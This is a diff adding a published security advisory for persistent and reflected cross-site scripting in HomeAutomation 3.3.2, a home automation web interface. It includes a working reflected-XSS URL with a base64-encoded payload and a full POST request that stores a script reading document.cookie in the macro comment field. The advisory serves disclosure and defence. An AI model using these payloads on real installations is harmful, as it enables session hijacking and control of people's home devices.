@@ -1,0 +1,115 @@
+# Exploit: HomeAutomation 3.3.2 - Persistent Cross-Site Scripting
+# Date: 2019-12-30
+# Author: LiquidWorm
+# Vendor: Tom Rosenback and Daniel Malmgren
+# Product web page: http://karpero.mine.nu/ha/
+# Affected version: 3.3.2
+# Tested on: Apache/2.4.41 (centos) OpenSSL/1.0.2k-fips
+# Advisory ID: ZSL-2019-5556
+# Advisory URL: https://www.zeroscience.mk/en/vulnerabilities/ZSL-2019-5556.php
+# HomeAutomation v3.3.2 Stored and Reflected XSS
+
+
+Vendor: Tom Rosenback and Daniel Malmgren
+Product web page: http://karpero.mine.nu/ha/
+Affected version: 3.3.2
+
+Summary: HomeAutomation is an open-source web interface and scheduling solution.
+It was initially made for use with the Telldus TellStick, but is now based on a
+plugin system and except for Tellstick it also comes with support for Crestron,
+OWFS and Z-Wave (using OpenZWave). It controls your devices (switches, dimmers,
+etc.) based on an advanced scheduling system, taking into account things like
+measurements from various sensors. With the houseplan view you can get a simple
+overview of the status of your devices at their location in your house.
+
+Desc: HomeAutomation suffers from multiple stored and reflected XSS vulnerabilities
+when input passed via several parameters to several scripts is not properly sanitized
+before being returned to the user. This can be exploited to execute arbitrary HTML
+and script code in a user's browser session in context of an affected site.
+
+Tested on: Apache/2.4.41 (centos) OpenSSL/1.0.2k-fips
+           Apache/2.4.29 (Ubuntu)
+           PHP/7.4.0RC4
+           PHP/7.3.11
+           PHP 7.2.24-0ubuntu0.18.04.1
+
+
+Vulnerability discovered by Gjoko 'LiquidWorm' Krstic
+                            @zeroscience
+
+
+Advisory ID: ZSL-2019-5556
+Advisory URL: https://www.zeroscience.mk/en/vulnerabilities/ZSL-2019-5556.php
+
+
+06.11.2019
+
+--
+
+
+Reflected XSS:
+--------------
+
+https://192.168.2.113/?page=houseplan&autologin=1&msg=eyJpZCI6IiIsInRleHQiOiI8bWFycXVlZT50ZXN0PC9tYXJxdWVlPlVzZXJuYW1lIG9yIHBhc3N3b3JkIHdyb25nIiwiYWRkaXRpb25hbFRleHQiOiIiLCJ0eXBlIjoiZXJyb3IiLCJhdXRvQ2xvc2UiOmZhbHNlLCJzaG93T25seUluRGVidWciOmZhbHNlfQ==
+
+
+Stored XSS:
+-----------
+
+POST /homeautomation_v3_3_2/?page=conf-macros HTTP/1.1
+Host: localhost
+Connection: keep-alive
+Content-Length: 998
+Cache-Control: max-age=0
+Origin: http://localhost
+Upgrade-Insecure-Requests: 1
+Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryq4LcgA7mbqElCW4q
+User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.70 Safari/537.36
+Sec-Fetch-User: ?1
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3
+Sec-Fetch-Site: same-origin
+Sec-Fetch-Mode: navigate
+Referer: http://localhost/homeautomation_v3_3_2/?page=conf-macros&action=edit&id=-1
+Accept-Encoding: gzip, deflate, br
+Accept-Language: en-GB,en-US;q=0.9,en;q=0.8
+Cookie: HomeAutomation_user=admin; HomeAutomation_hash=842427e5fc831255d7aa811b70e64957; PHPSESSID=ldcipit064rfp5l8rtcah091og
+
+
+------WebKitFormBoundaryq4LcgA7mbqElCW4q
+Content-Disposition: form-data; name="id"
+
+-1
+------WebKitFormBoundaryq4LcgA7mbqElCW4q
+Content-Disposition: form-data; name="action"
+
+save
+------WebKitFormBoundaryq4LcgA7mbqElCW4q
+Content-Disposition: form-data; name="name"
+
+XSS
+------WebKitFormBoundaryq4LcgA7mbqElCW4q
+Content-Disposition: form-data; name="comment"
+
+"><script>confirm(document.cookie)</script>
+------WebKitFormBoundaryq4LcgA7mbqElCW4q
+Content-Disposition: form-data; name="icon_on"; filename=""
+Content-Type: application/octet-stream
+
+
+------WebKitFormBoundaryq4LcgA7mbqElCW4q
+Content-Disposition: form-data; name="scenario"
+
+1
+------WebKitFormBoundaryq4LcgA7mbqElCW4q
+Content-Disposition: form-data; name="devices[0]"
+
+1
+------WebKitFormBoundaryq4LcgA7mbqElCW4q
+Content-Disposition: form-data; name="statuses[0]"
+
+1
+------WebKitFormBoundaryq4LcgA7mbqElCW4q
+Content-Disposition: form-data; name="save"
+
+Save
+------WebKitFormBoundaryq4LcgA7mbqElCW4q--
